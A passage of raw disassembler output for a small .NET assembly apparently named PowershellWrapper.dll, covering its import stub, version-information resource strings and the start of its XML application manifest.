  40300c:	68 65 6c 6c 57       	push   0x576c6c65
  403011:	72 61                	jb     0x403074
  403013:	70 70                	jo     0x403085
  403015:	65 72 2e             	gs jb  0x403046
  403018:	70 64                	jo     0x40307e
  40301a:	62 00                	bound  eax,QWORD PTR [eax]
  40301c:	53                   	push   ebx
  40301d:	48                   	dec    eax
  40301e:	41                   	inc    ecx
  40301f:	32 35 36 00 1e 9b    	xor    dh,BYTE PTR ds:0x9b1e0036
  403025:	ab                   	stos   DWORD PTR es:[edi],eax
  403026:	4c                   	dec    esp
  403027:	c0 e0 53             	shl    al,0x53
  40302a:	87 ec                	xchg   esp,ebp
  40302c:	2b 12                	sub    edx,DWORD PTR [edx]
  40302e:	13 cf                	adc    ecx,edi
  403030:	c8 87 46 00          	enter  0x4687,0x0
  403034:	4d                   	dec    ebp
  403035:	5a                   	pop    edx
  403036:	ba c3 1e be be       	mov    edx,0xbebe1ec3
  40303b:	f4                   	hlt    
  40303c:	fe ce                	dec    dh
  40303e:	19 73 b9             	sbb    DWORD PTR [ebx-0x47],esi
  403041:	9e                   	sahf   
  403042:	92                   	xchg   edx,eax
  403043:	6b 30 00             	imul   esi,DWORD PTR [eax],0x0
	...
  40304e:	00 85 30 00 00 00    	add    BYTE PTR [ebp+0x30],al
  403054:	20 00                	and    BYTE PTR [eax],al
	...
  40306a:	00 77 30             	add    BYTE PTR [edi+0x30],dh
	...
  403079:	5f                   	pop    edi
  40307a:	43                   	inc    ebx
  40307b:	6f                   	outs   dx,DWORD PTR ds:[esi]
  40307c:	72 45                	jb     0x4030c3
  40307e:	78 65                	js     0x4030e5
  403080:	4d                   	dec    ebp
  403081:	61                   	popa   
  403082:	69 6e 00 6d 73 63 6f 	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  403089:	72 65                	jb     0x4030f0
  40308b:	65 2e 64 6c          	gs cs fs ins BYTE PTR es:[edi],dx
  40308f:	6c                   	ins    BYTE PTR es:[edi],dx
  403090:	00 00                	add    BYTE PTR [eax],al
  403092:	00 00                	add    BYTE PTR [eax],al
  403094:	00 00                	add    BYTE PTR [eax],al
  403096:	ff 25 00 20 40 00    	jmp    DWORD PTR ds:0x402000

Disassembly of section .rsrc:

00404000 <.rsrc>:
	...
  40400c:	00 00                	add    BYTE PTR [eax],al
  40400e:	02 00                	add    al,BYTE PTR [eax]
  404010:	10 00                	adc    BYTE PTR [eax],al
  404012:	00 00                	add    BYTE PTR [eax],al
  404014:	20 00                	and    BYTE PTR [eax],al
  404016:	00 80 18 00 00 00    	add    BYTE PTR [eax+0x18],al
  40401c:	50                   	push   eax
  40401d:	00 00                	add    BYTE PTR [eax],al
  40401f:	80 00 00             	add    BYTE PTR [eax],0x0
	...
  40402e:	01 00                	add    DWORD PTR [eax],eax
  404030:	01 00                	add    DWORD PTR [eax],eax
  404032:	00 00                	add    BYTE PTR [eax],al
  404034:	38 00                	cmp    BYTE PTR [eax],al
  404036:	00 80 00 00 00 00    	add    BYTE PTR [eax+0x0],al
	...
  404044:	00 00                	add    BYTE PTR [eax],al
  404046:	01 00                	add    DWORD PTR [eax],eax
  404048:	00 00                	add    BYTE PTR [eax],al
  40404a:	00 00                	add    BYTE PTR [eax],al
  40404c:	80 00 00             	add    BYTE PTR [eax],0x0
	...
  40405b:	00 00                	add    BYTE PTR [eax],al
  40405d:	00 01                	add    BYTE PTR [ecx],al
  40405f:	00 01                	add    BYTE PTR [ecx],al
  404061:	00 00                	add    BYTE PTR [eax],al
  404063:	00 68 00             	add    BYTE PTR [eax+0x0],ch
  404066:	00 80 00 00 00 00    	add    BYTE PTR [eax+0x0],al
	...
  404074:	00 00                	add    BYTE PTR [eax],al
  404076:	01 00                	add    DWORD PTR [eax],eax
  404078:	00 00                	add    BYTE PTR [eax],al
  40407a:	00 00                	add    BYTE PTR [eax],al
  40407c:	a0 03 00 00 90       	mov    al,ds:0x90000003
  404081:	40                   	inc    eax
  404082:	00 00                	add    BYTE PTR [eax],al
  404084:	10 03                	adc    BYTE PTR [ebx],al
	...
  40408e:	00 00                	add    BYTE PTR [eax],al
  404090:	10 03                	adc    BYTE PTR [ebx],al
  404092:	34 00                	xor    al,0x0
  404094:	00 00                	add    BYTE PTR [eax],al
  404096:	56                   	push   esi
  404097:	00 53 00             	add    BYTE PTR [ebx+0x0],dl
  40409a:	5f                   	pop    edi
  40409b:	00 56 00             	add    BYTE PTR [esi+0x0],dl
  40409e:	45                   	inc    ebp
  40409f:	00 52 00             	add    BYTE PTR [edx+0x0],dl
  4040a2:	53                   	push   ebx
  4040a3:	00 49 00             	add    BYTE PTR [ecx+0x0],cl
  4040a6:	4f                   	dec    edi
  4040a7:	00 4e 00             	add    BYTE PTR [esi+0x0],cl
  4040aa:	5f                   	pop    edi
  4040ab:	00 49 00             	add    BYTE PTR [ecx+0x0],cl
  4040ae:	4e                   	dec    esi
  4040af:	00 46 00             	add    BYTE PTR [esi+0x0],al
  4040b2:	4f                   	dec    edi
  4040b3:	00 00                	add    BYTE PTR [eax],al
  4040b5:	00 00                	add    BYTE PTR [eax],al
  4040b7:	00 bd 04 ef fe 00    	add    BYTE PTR [ebp+0xfeef04],bh
  4040bd:	00 01                	add    BYTE PTR [ecx],al
  4040bf:	00 00                	add    BYTE PTR [eax],al
  4040c1:	00 01                	add    BYTE PTR [ecx],al
  4040c3:	00 00                	add    BYTE PTR [eax],al
  4040c5:	00 00                	add    BYTE PTR [eax],al
  4040c7:	00 00                	add    BYTE PTR [eax],al
  4040c9:	00 01                	add    BYTE PTR [ecx],al
  4040cb:	00 00                	add    BYTE PTR [eax],al
  4040cd:	00 00                	add    BYTE PTR [eax],al
  4040cf:	00 3f                	add    BYTE PTR [edi],bh
  4040d1:	00 00                	add    BYTE PTR [eax],al
  4040d3:	00 00                	add    BYTE PTR [eax],al
  4040d5:	00 00                	add    BYTE PTR [eax],al
  4040d7:	00 04 00             	add    BYTE PTR [eax+eax*1],al
  4040da:	00 00                	add    BYTE PTR [eax],al
  4040dc:	01 00                	add    DWORD PTR [eax],eax
	...
  4040ea:	00 00                	add    BYTE PTR [eax],al
  4040ec:	44                   	inc    esp
  4040ed:	00 00                	add    BYTE PTR [eax],al
  4040ef:	00 01                	add    BYTE PTR [ecx],al
  4040f1:	00 56 00             	add    BYTE PTR [esi+0x0],dl
  4040f4:	61                   	popa   
  4040f5:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  4040f8:	46                   	inc    esi
  4040f9:	00 69 00             	add    BYTE PTR [ecx+0x0],ch
  4040fc:	6c                   	ins    BYTE PTR es:[edi],dx
  4040fd:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  404100:	49                   	dec    ecx
  404101:	00 6e 00             	add    BYTE PTR [esi+0x0],ch
  404104:	66 00 6f 00          	data16 add BYTE PTR [edi+0x0],ch
  404108:	00 00                	add    BYTE PTR [eax],al
  40410a:	00 00                	add    BYTE PTR [eax],al
  40410c:	24 00                	and    al,0x0
  40410e:	04 00                	add    al,0x0
  404110:	00 00                	add    BYTE PTR [eax],al
  404112:	54                   	push   esp
  404113:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  404116:	61                   	popa   
  404117:	00 6e 00             	add    BYTE PTR [esi+0x0],ch
  40411a:	73 00                	jae    0x40411c
  40411c:	6c                   	ins    BYTE PTR es:[edi],dx
  40411d:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  404120:	74 00                	je     0x404122
  404122:	69 00 6f 00 6e 00    	imul   eax,DWORD PTR [eax],0x6e006f
  404128:	00 00                	add    BYTE PTR [eax],al
  40412a:	00 00                	add    BYTE PTR [eax],al
  40412c:	00 00                	add    BYTE PTR [eax],al
  40412e:	b0 04                	mov    al,0x4
  404130:	70 02                	jo     0x404134
  404132:	00 00                	add    BYTE PTR [eax],al
  404134:	01 00                	add    DWORD PTR [eax],eax
  404136:	53                   	push   ebx
  404137:	00 74 00 72          	add    BYTE PTR [eax+eax*1+0x72],dh
  40413b:	00 69 00             	add    BYTE PTR [ecx+0x0],ch
  40413e:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40413f:	00 67 00             	add    BYTE PTR [edi+0x0],ah
  404142:	46                   	inc    esi
  404143:	00 69 00             	add    BYTE PTR [ecx+0x0],ch
  404146:	6c                   	ins    BYTE PTR es:[edi],dx
  404147:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  40414a:	49                   	dec    ecx
  40414b:	00 6e 00             	add    BYTE PTR [esi+0x0],ch
  40414e:	66 00 6f 00          	data16 add BYTE PTR [edi+0x0],ch
  404152:	00 00                	add    BYTE PTR [eax],al
  404154:	4c                   	dec    esp
  404155:	02 00                	add    al,BYTE PTR [eax]
  404157:	00 01                	add    BYTE PTR [ecx],al
  404159:	00 30                	add    BYTE PTR [eax],dh
  40415b:	00 30                	add    BYTE PTR [eax],dh
  40415d:	00 30                	add    BYTE PTR [eax],dh
  40415f:	00 30                	add    BYTE PTR [eax],dh
  404161:	00 30                	add    BYTE PTR [eax],dh
  404163:	00 34 00             	add    BYTE PTR [eax+eax*1],dh
  404166:	62 00                	bound  eax,QWORD PTR [eax]
  404168:	30 00                	xor    BYTE PTR [eax],al
  40416a:	00 00                	add    BYTE PTR [eax],al
  40416c:	44                   	inc    esp
  40416d:	00 12                	add    BYTE PTR [edx],dl
  40416f:	00 01                	add    BYTE PTR [ecx],al
  404171:	00 43 00             	add    BYTE PTR [ebx+0x0],al
  404174:	6f                   	outs   dx,DWORD PTR ds:[esi]
  404175:	00 6d 00             	add    BYTE PTR [ebp+0x0],ch
  404178:	70 00                	jo     0x40417a
  40417a:	61                   	popa   
  40417b:	00 6e 00             	add    BYTE PTR [esi+0x0],ch
  40417e:	79 00                	jns    0x404180
  404180:	4e                   	dec    esi
  404181:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  404184:	6d                   	ins    DWORD PTR es:[edi],dx
  404185:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  404188:	00 00                	add    BYTE PTR [eax],al
  40418a:	00 00                	add    BYTE PTR [eax],al
  40418c:	50                   	push   eax
  40418d:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  404190:	77 00                	ja     0x404192
  404192:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  404196:	73 00                	jae    0x404198
  404198:	68 00 65 00 6c       	push   0x6c006500
  40419d:	00 6c 00 57          	add    BYTE PTR [eax+eax*1+0x57],ch
  4041a1:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  4041a4:	61                   	popa   
  4041a5:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  4041a8:	70 00                	jo     0x4041aa
  4041aa:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  4041ae:	00 00                	add    BYTE PTR [eax],al
  4041b0:	4c                   	dec    esp
  4041b1:	00 12                	add    BYTE PTR [edx],dl
  4041b3:	00 01                	add    BYTE PTR [ecx],al
  4041b5:	00 46 00             	add    BYTE PTR [esi+0x0],al
  4041b8:	69 00 6c 00 65 00    	imul   eax,DWORD PTR [eax],0x65006c
  4041be:	44                   	inc    esp
  4041bf:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  4041c2:	73 00                	jae    0x4041c4
  4041c4:	63 00                	arpl   WORD PTR [eax],ax
  4041c6:	72 00                	jb     0x4041c8
  4041c8:	69 00 70 00 74 00    	imul   eax,DWORD PTR [eax],0x740070
  4041ce:	69 00 6f 00 6e 00    	imul   eax,DWORD PTR [eax],0x6e006f
  4041d4:	00 00                	add    BYTE PTR [eax],al
  4041d6:	00 00                	add    BYTE PTR [eax],al
  4041d8:	50                   	push   eax
  4041d9:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  4041dc:	77 00                	ja     0x4041de
  4041de:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  4041e2:	73 00                	jae    0x4041e4
  4041e4:	68 00 65 00 6c       	push   0x6c006500
  4041e9:	00 6c 00 57          	add    BYTE PTR [eax+eax*1+0x57],ch
  4041ed:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  4041f0:	61                   	popa   
  4041f1:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  4041f4:	70 00                	jo     0x4041f6
  4041f6:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  4041fa:	00 00                	add    BYTE PTR [eax],al
  4041fc:	30 00                	xor    BYTE PTR [eax],al
  4041fe:	08 00                	or     BYTE PTR [eax],al
  404200:	01 00                	add    DWORD PTR [eax],eax
  404202:	46                   	inc    esi
  404203:	00 69 00             	add    BYTE PTR [ecx+0x0],ch
  404206:	6c                   	ins    BYTE PTR es:[edi],dx
  404207:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  40420a:	56                   	push   esi
  40420b:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  40420e:	72 00                	jb     0x404210
  404210:	73 00                	jae    0x404212
  404212:	69 00 6f 00 6e 00    	imul   eax,DWORD PTR [eax],0x6e006f
  404218:	00 00                	add    BYTE PTR [eax],al
  40421a:	00 00                	add    BYTE PTR [eax],al
  40421c:	31 00                	xor    DWORD PTR [eax],eax
  40421e:	2e 00 30             	add    BYTE PTR cs:[eax],dh
  404221:	00 2e                	add    BYTE PTR [esi],ch
  404223:	00 30                	add    BYTE PTR [eax],dh
  404225:	00 2e                	add    BYTE PTR [esi],ch
  404227:	00 30                	add    BYTE PTR [eax],dh
  404229:	00 00                	add    BYTE PTR [eax],al
  40422b:	00 4c 00 16          	add    BYTE PTR [eax+eax*1+0x16],cl
  40422f:	00 01                	add    BYTE PTR [ecx],al
  404231:	00 49 00             	add    BYTE PTR [ecx+0x0],cl
  404234:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404235:	00 74 00 65          	add    BYTE PTR [eax+eax*1+0x65],dh
  404239:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  40423c:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40423d:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  404240:	6c                   	ins    BYTE PTR es:[edi],dx
  404241:	00 4e 00             	add    BYTE PTR [esi+0x0],cl
  404244:	61                   	popa   
  404245:	00 6d 00             	add    BYTE PTR [ebp+0x0],ch
  404248:	65 00 00             	add    BYTE PTR gs:[eax],al
  40424b:	00 50 00             	add    BYTE PTR [eax+0x0],dl
  40424e:	6f                   	outs   dx,DWORD PTR ds:[esi]
  40424f:	00 77 00             	add    BYTE PTR [edi+0x0],dh
  404252:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  404256:	73 00                	jae    0x404258
  404258:	68 00 65 00 6c       	push   0x6c006500
  40425d:	00 6c 00 57          	add    BYTE PTR [eax+eax*1+0x57],ch
  404261:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  404264:	61                   	popa   
  404265:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  404268:	70 00                	jo     0x40426a
  40426a:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  40426e:	2e 00 64 00 6c       	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  404273:	00 6c 00 00          	add    BYTE PTR [eax+eax*1+0x0],ch
  404277:	00 28                	add    BYTE PTR [eax],ch
  404279:	00 02                	add    BYTE PTR [edx],al
  40427b:	00 01                	add    BYTE PTR [ecx],al
  40427d:	00 4c 00 65          	add    BYTE PTR [eax+eax*1+0x65],cl
  404281:	00 67 00             	add    BYTE PTR [edi+0x0],ah
  404284:	61                   	popa   
  404285:	00 6c 00 43          	add    BYTE PTR [eax+eax*1+0x43],ch
  404289:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  40428c:	70 00                	jo     0x40428e
  40428e:	79 00                	jns    0x404290
  404290:	72 00                	jb     0x404292
  404292:	69 00 67 00 68 00    	imul   eax,DWORD PTR [eax],0x680067
  404298:	74 00                	je     0x40429a
  40429a:	00 00                	add    BYTE PTR [eax],al
  40429c:	20 00                	and    BYTE PTR [eax],al
  40429e:	00 00                	add    BYTE PTR [eax],al
  4042a0:	54                   	push   esp
  4042a1:	00 16                	add    BYTE PTR [esi],dl
  4042a3:	00 01                	add    BYTE PTR [ecx],al
  4042a5:	00 4f 00             	add    BYTE PTR [edi+0x0],cl
  4042a8:	72 00                	jb     0x4042aa
  4042aa:	69 00 67 00 69 00    	imul   eax,DWORD PTR [eax],0x690067
  4042b0:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4042b1:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  4042b4:	6c                   	ins    BYTE PTR es:[edi],dx
  4042b5:	00 46 00             	add    BYTE PTR [esi+0x0],al
  4042b8:	69 00 6c 00 65 00    	imul   eax,DWORD PTR [eax],0x65006c
  4042be:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4042bf:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  4042c2:	6d                   	ins    DWORD PTR es:[edi],dx
  4042c3:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  4042c6:	00 00                	add    BYTE PTR [eax],al
  4042c8:	50                   	push   eax
  4042c9:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  4042cc:	77 00                	ja     0x4042ce
  4042ce:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  4042d2:	73 00                	jae    0x4042d4
  4042d4:	68 00 65 00 6c       	push   0x6c006500
  4042d9:	00 6c 00 57          	add    BYTE PTR [eax+eax*1+0x57],ch
  4042dd:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  4042e0:	61                   	popa   
  4042e1:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  4042e4:	70 00                	jo     0x4042e6
  4042e6:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  4042ea:	2e 00 64 00 6c       	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4042ef:	00 6c 00 00          	add    BYTE PTR [eax+eax*1+0x0],ch
  4042f3:	00 44 00 12          	add    BYTE PTR [eax+eax*1+0x12],al
  4042f7:	00 01                	add    BYTE PTR [ecx],al
  4042f9:	00 50 00             	add    BYTE PTR [eax+0x0],dl
  4042fc:	72 00                	jb     0x4042fe
  4042fe:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4042ff:	00 64 00 75          	add    BYTE PTR [eax+eax*1+0x75],ah
  404303:	00 63 00             	add    BYTE PTR [ebx+0x0],ah
  404306:	74 00                	je     0x404308
  404308:	4e                   	dec    esi
  404309:	00 61 00             	add    BYTE PTR [ecx+0x0],ah
  40430c:	6d                   	ins    DWORD PTR es:[edi],dx
  40430d:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  404310:	00 00                	add    BYTE PTR [eax],al
  404312:	00 00                	add    BYTE PTR [eax],al
  404314:	50                   	push   eax
  404315:	00 6f 00             	add    BYTE PTR [edi+0x0],ch
  404318:	77 00                	ja     0x40431a
  40431a:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  40431e:	73 00                	jae    0x404320
  404320:	68 00 65 00 6c       	push   0x6c006500
  404325:	00 6c 00 57          	add    BYTE PTR [eax+eax*1+0x57],ch
  404329:	00 72 00             	add    BYTE PTR [edx+0x0],dh
  40432c:	61                   	popa   
  40432d:	00 70 00             	add    BYTE PTR [eax+0x0],dh
  404330:	70 00                	jo     0x404332
  404332:	65 00 72 00          	add    BYTE PTR gs:[edx+0x0],dh
  404336:	00 00                	add    BYTE PTR [eax],al
  404338:	30 00                	xor    BYTE PTR [eax],al
  40433a:	06                   	push   es
  40433b:	00 01                	add    BYTE PTR [ecx],al
  40433d:	00 50 00             	add    BYTE PTR [eax+0x0],dl
  404340:	72 00                	jb     0x404342
  404342:	6f                   	outs   dx,DWORD PTR ds:[esi]
  404343:	00 64 00 75          	add    BYTE PTR [eax+eax*1+0x75],ah
  404347:	00 63 00             	add    BYTE PTR [ebx+0x0],ah
  40434a:	74 00                	je     0x40434c
  40434c:	56                   	push   esi
  40434d:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  404350:	72 00                	jb     0x404352
  404352:	73 00                	jae    0x404354
  404354:	69 00 6f 00 6e 00    	imul   eax,DWORD PTR [eax],0x6e006f
  40435a:	00 00                	add    BYTE PTR [eax],al
  40435c:	31 00                	xor    DWORD PTR [eax],eax
  40435e:	2e 00 30             	add    BYTE PTR cs:[eax],dh
  404361:	00 2e                	add    BYTE PTR [esi],ch
  404363:	00 30                	add    BYTE PTR [eax],dh
  404365:	00 00                	add    BYTE PTR [eax],al
  404367:	00 38                	add    BYTE PTR [eax],bh
  404369:	00 08                	add    BYTE PTR [eax],cl
  40436b:	00 01                	add    BYTE PTR [ecx],al
  40436d:	00 41 00             	add    BYTE PTR [ecx+0x0],al
  404370:	73 00                	jae    0x404372
  404372:	73 00                	jae    0x404374
  404374:	65 00 6d 00          	add    BYTE PTR gs:[ebp+0x0],ch
  404378:	62 00                	bound  eax,QWORD PTR [eax]
  40437a:	6c                   	ins    BYTE PTR es:[edi],dx
  40437b:	00 79 00             	add    BYTE PTR [ecx+0x0],bh
  40437e:	20 00                	and    BYTE PTR [eax],al
  404380:	56                   	push   esi
  404381:	00 65 00             	add    BYTE PTR [ebp+0x0],ah
  404384:	72 00                	jb     0x404386
  404386:	73 00                	jae    0x404388
  404388:	69 00 6f 00 6e 00    	imul   eax,DWORD PTR [eax],0x6e006f
  40438e:	00 00                	add    BYTE PTR [eax],al
  404390:	31 00                	xor    DWORD PTR [eax],eax
  404392:	2e 00 30             	add    BYTE PTR cs:[eax],dh
  404395:	00 2e                	add    BYTE PTR [esi],ch
  404397:	00 30                	add    BYTE PTR [eax],dh
  404399:	00 2e                	add    BYTE PTR [esi],ch
  40439b:	00 30                	add    BYTE PTR [eax],dh
  40439d:	00 00                	add    BYTE PTR [eax],al
  40439f:	00 b0 43 00 00 ea    	add    BYTE PTR [eax-0x15ffffbd],dh
  4043a5:	01 00                	add    DWORD PTR [eax],eax
	...
  4043af:	00 ef                	add    bh,ch
  4043b1:	bb bf 3c 3f 78       	mov    ebx,0x783f3cbf
  4043b6:	6d                   	ins    DWORD PTR es:[edi],dx
  4043b7:	6c                   	ins    BYTE PTR es:[edi],dx
  4043b8:	20 76 65             	and    BYTE PTR [esi+0x65],dh
  4043bb:	72 73                	jb     0x404430
  4043bd:	69 6f 6e 3d 22 31 2e 	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4043c4:	30 22                	xor    BYTE PTR [edx],ah
  4043c6:	20 65 6e             	and    BYTE PTR [ebp+0x6e],ah
  4043c9:	63 6f 64             	arpl   WORD PTR [edi+0x64],bp
  4043cc:	69 6e 67 3d 22 55 54 	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  4043d3:	46                   	inc    esi
  4043d4:	2d 38 22 20 73       	sub    eax,0x73202238
  4043d9:	74 61                	je     0x40443c
  4043db:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4043dc:	64 61                	fs popa 
  4043de:	6c                   	ins    BYTE PTR es:[edi],dx
  4043df:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4043e0:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4043e1:	65 3d 22 79 65 73    	gs cmp eax,0x73657922
  4043e7:	22 3f                	and    bh,BYTE PTR [edi]
  4043e9:	3e 0d 0a 0d 0a 3c    	ds or  eax,0x3c0a0d0a
  4043ef:	61                   	popa   
  4043f0:	73 73                	jae    0x404465
  4043f2:	65 6d                	gs ins DWORD PTR es:[edi],dx
  4043f4:	62 6c 79 20          	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4043f8:	78 6d                	js     0x404467
  4043fa:	6c                   	ins    BYTE PTR es:[edi],dx
  4043fb:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4043fc:	73 3d                	jae    0x40443b
  4043fe:	22 75 72             	and    dh,BYTE PTR [ebp+0x72]
  404401:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404402:	3a 73 63             	cmp    dh,BYTE PTR [ebx+0x63]
  404405:	68 65 6d 61 73       	push   0x73616d65
  40440a:	2d 6d 69 63 72       	sub    eax,0x7263696d
  40440f:	6f                   	outs   dx,DWORD PTR ds:[esi]
  404410:	73 6f                	jae    0x404481
  404412:	66 74 2d             	data16 je 0x404442
  404415:	63 6f 6d             	arpl   WORD PTR [edi+0x6d],bp
  404418:	3a 61 73             	cmp    ah,BYTE PTR [ecx+0x73]
  40441b:	6d                   	ins    DWORD PTR es:[edi],dx
  40441c:	2e 76 31             	cs jbe 0x404450
  40441f:	22 20                	and    ah,BYTE PTR [eax]
  404421:	6d                   	ins    DWORD PTR es:[edi],dx
  404422:	61                   	popa   
  404423:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404424:	69 66 65 73 74 56 65 	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40442b:	72 73                	jb     0x4044a0
  40442d:	69 6f 6e 3d 22 31 2e 	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404434:	30 22                	xor    BYTE PTR [edx],ah
  404436:	3e 0d 0a 20 20 3c    	ds or  eax,0x3c20200a
  40443c:	61                   	popa   
  40443d:	73 73                	jae    0x4044b2
  40443f:	65 6d                	gs ins DWORD PTR es:[edi],dx
  404441:	62 6c 79 49          	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404445:	64 65 6e             	fs outs dx,BYTE PTR gs:[esi]
  404448:	74 69                	je     0x4044b3
  40444a:	74 79                	je     0x4044c5
  40444c:	20 76 65             	and    BYTE PTR [esi+0x65],dh
  40444f:	72 73                	jb     0x4044c4
  404451:	69 6f 6e 3d 22 31 2e 	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  404458:	30 2e                	xor    BYTE PTR [esi],ch
  40445a:	30 2e                	xor    BYTE PTR [esi],ch
  40445c:	30 22                	xor    BYTE PTR [edx],ah
  40445e:	20 6e 61             	and    BYTE PTR [esi+0x61],ch
  404461:	6d                   	ins    DWORD PTR es:[edi],dx
  404462:	65 3d 22 4d 79 41    	gs cmp eax,0x41794d22
  404468:	70 70                	jo     0x4044da
  40446a:	6c                   	ins    BYTE PTR es:[edi],dx
  40446b:	69 63 61 74 69 6f 6e 	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404472:	2e 61                	cs popa 
  404474:	70 70                	jo     0x4044e6
  404476:	22 2f                	and    ch,BYTE PTR [edi]
  404478:	3e 0d 0a 20 20 3c    	ds or  eax,0x3c20200a
  40447e:	74 72                	je     0x4044f2
  404480:	75 73                	jne    0x4044f5
  404482:	74 49                	je     0x4044cd
  404484:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404485:	66 6f                	outs   dx,WORD PTR ds:[esi]
  404487:	20 78 6d             	and    BYTE PTR [eax+0x6d],bh
  40448a:	6c                   	ins    BYTE PTR es:[edi],dx
  40448b:	6e                   	outs   dx,BYTE PTR ds:[esi]
  40448c:	73 3d                	jae    0x4044cb
  40448e:	22 75 72             	and    dh,BYTE PTR [ebp+0x72]
  404491:	6e                   	outs   dx,BYTE PTR ds:[esi]
  404492:	3a 73 63             	cmp    dh,BYTE PTR [ebx+0x63]
  404495:	68 65 6d 61 73       	push   0x73616d65
  40449a:	2d 6d 69 63 72       	sub    eax,0x7263696d
  40449f:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4044a0:	73 6f                	jae    0x404511
  4044a2:	66 74 2d             	data16 je 0x4044d2
  4044a5:	63 6f 6d             	arpl   WORD PTR [edi+0x6d],bp
  4044a8:	3a 61 73             	cmp    ah,BYTE PTR [ecx+0x73]
  4044ab:	6d                   	ins    DWORD PTR es:[edi],dx
  4044ac:	2e 76 32             	cs jbe 0x4044e1
  4044af:	22 3e                	and    bh,BYTE PTR [esi]
  4044b1:	0d 0a 20 20 20       	or     eax,0x2020200a
  4044b6:	20 3c 73             	and    BYTE PTR [ebx+esi*2],bh
  4044b9:	65 63 75 72          	arpl   WORD PTR gs:[ebp+0x72],si
  4044bd:	69 74 79 3e 0d 0a 20 	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  4044c4:	20 
  4044c5:	20 20                	and    BYTE PTR [eax],ah
  4044c7:	20 20                	and    BYTE PTR [eax],ah
  4044c9:	3c 72                	cmp    al,0x72
  4044cb:	65 71 75             	gs jno 0x404543
  4044ce:	65 73 74             	gs jae 0x404545
  4044d1:	65 64 50             	gs fs push eax
  4044d4:	72 69                	jb     0x40453f
  4044d6:	76 69                	jbe    0x404541
  4044d8:	6c                   	ins    BYTE PTR es:[edi],dx
  4044d9:	65 67 65 73 20       	gs addr16 gs jae 0x4044fe
  4044de:	78 6d                	js     0x40454d
  4044e0:	6c                   	ins    BYTE PTR es:[edi],dx
  4044e1:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4044e2:	73 3d                	jae    0x404521
  4044e4:	22 75 72             	and    dh,BYTE PTR [ebp+0x72]
  4044e7:	6e                   	outs   dx,BYTE PTR ds:[esi]
  4044e8:	3a 73 63             	cmp    dh,BYTE PTR [ebx+0x63]
  4044eb:	68 65 6d 61 73       	push   0x73616d65
  4044f0:	2d 6d 69 63 72       	sub    eax,0x7263696d
  4044f5:	6f                   	outs   dx,DWORD PTR ds:[esi]
  4044f6:	73 6f                	jae    0x404567
  4044f8:	66 74 2d             	data16 je 0x404528
  4044fb:	63 6f 6d             	arpl   WORD PTR [edi+0x6d],bp
  4044fe:	3a 61 73             	cmp    ah,BYTE PTR [ecx+0x73]
  404501:	6d                   	ins    DWORD PTR es:[edi],dx
  404502:	2e 76 33             	cs jbe 0x404538
  404505:	22 3e                	and    bh,BYTE PTR [esi]
  404507:	0d 0a 20 20 20       	or     eax,0x2020200a
  40450c:	20 20                	and    BYTE PTR [eax],ah
  40450e:	20 20                	and    BYTE PTR [eax],ah
  404510:	20 3c 72             	and    BYTE PTR [edx+esi*2],bh
